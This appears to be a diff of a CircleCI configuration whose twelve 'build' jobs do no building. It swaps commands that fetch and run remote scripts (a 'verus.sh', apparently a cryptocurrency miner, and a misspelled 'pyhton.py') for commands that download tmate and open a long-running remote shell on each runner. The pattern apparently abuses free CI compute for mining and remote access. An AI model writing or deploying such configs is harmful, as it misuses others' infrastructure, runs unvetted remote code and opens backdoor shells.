@@ -11,7 +11,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/nurfasikin/verust/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start"              
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"              
       
   build_02:
     docker:
@@ -24,7 +24,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/nurfasikin/verust/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_03:
     docker:
@@ -37,7 +37,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_04:
     docker:
@@ -50,7 +50,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
 
   build_05:
     docker:
@@ -63,7 +63,7 @@ jobs:
       - run:
           no_output_timeout: 362m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"              
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"              
       
   build_06:
     docker:
@@ -76,7 +76,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_07:
     docker:
@@ -89,7 +89,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_08:
     docker:
@@ -102,7 +102,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py" 
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F" 
 
   build_09:
     docker:
@@ -115,7 +115,7 @@ jobs:
       - run:
           no_output_timeout: 362m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"              
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"              
       
   build_10:
     docker:
@@ -128,7 +128,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_11:
     docker:
@@ -141,7 +141,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"
       
   build_12:
     docker:
@@ -154,7 +154,7 @@ jobs:
       - run:
           no_output_timeout: 300m
           
-          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"  
+          command: "wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz >/dev/null 2>&1 && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F"  
       
   
 workflows:
